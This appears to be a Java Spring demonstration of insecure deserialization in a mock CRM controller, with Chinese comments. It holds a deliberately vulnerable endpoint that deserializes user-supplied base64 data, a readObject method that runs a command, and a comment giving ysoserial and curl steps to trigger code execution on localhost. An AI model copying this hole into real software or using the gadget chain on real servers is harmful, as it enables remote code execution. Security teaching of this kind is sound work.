package com.crm.example;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.Base64;

@RestController
@RequestMapping("/customers")
public class CustomerController {
    
    // 模拟CRM系统中的客户数据类
    public static class Customer implements java.io.Serializable {
        private String name;
        private int id;
        private String email;
        
        // 恶意代码执行点（通过反序列化链）
        private void readObject(java.io.ObjectInputStream in)
            throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            // 模拟业务逻辑中的潜在风险操作
            if ("calc".equals(name)) {
                Runtime.getRuntime().exec("calc");
            }
        }
    }

    // 不安全的反序列化端点
    @GetMapping("/deserialize")
    public String deserialize(@RequestParam String data) {
        try {
            byte[] decoded = Base64.getDecoder().decode(data);
            ByteArrayInputStream bais = new ByteArrayInputStream(decoded);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Customer customer = (Customer) ois.readObject(); // 漏洞触发点
            ois.close();
            return "Deserialized customer: " + customer.name;
        } catch (Exception e) {
            return "Deserialization failed: " + e.getMessage();
        }
    }

    // 正常的序列化端点（用于生成payload测试）
    @GetMapping("/serialize")
    public String serialize(@RequestParam String name) {
        try {
            Customer customer = new Customer();
            customer.name = name;
            
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(customer);
            oos.close();
            
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        } catch (Exception e) {
            return "Serialization failed";
        }
    }

    // 漏洞验证示例：curl请求
    // curl "http://localhost:8080/customers/deserialize?data=TZzMqQJzqQJ4oQ==" 
    // （实际攻击需使用ysoserial生成有效载荷）
}

/*
攻击流程说明：
1. 攻击者使用ysoserial生成包含恶意代码的序列化对象
   java -jar ysoserial.jar CommonsCollections5 "calc" | base64
2. 发送请求：
   curl "http://localhost:8080/customers/deserialize?data=[PAYLOAD]"
3. 服务器反序列化时将执行计算器
*/